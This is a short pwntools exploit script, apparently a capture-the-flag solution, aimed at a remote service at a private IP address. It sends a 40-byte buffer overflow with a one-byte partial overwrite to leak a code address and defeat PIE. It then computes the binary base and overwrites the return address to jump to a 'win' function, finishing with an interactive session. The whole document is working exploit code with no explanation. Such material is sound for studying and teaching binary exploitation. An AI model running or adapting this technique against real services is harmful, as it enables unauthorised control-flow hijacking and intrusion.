from pwn import  *

p = remote("192.168.100.226",9091)
#p = process('./main')

payload = b'A'*40 + b'\x1c'

p.send(payload)

p.recvline()
pie_leak=p.recvline()

leak_bytes = pie_leak[40:-1]  
leak_addr = u64(leak_bytes.ljust(8, b'\x00'))  
print(hex(leak_addr))

base=leak_addr - 0x000000000000121c

win=base + 0x1129
ret = base + 0x000000000000123e
payload2 = b'A'*40 + p64(win)
p.send(payload2)
p.interactive()


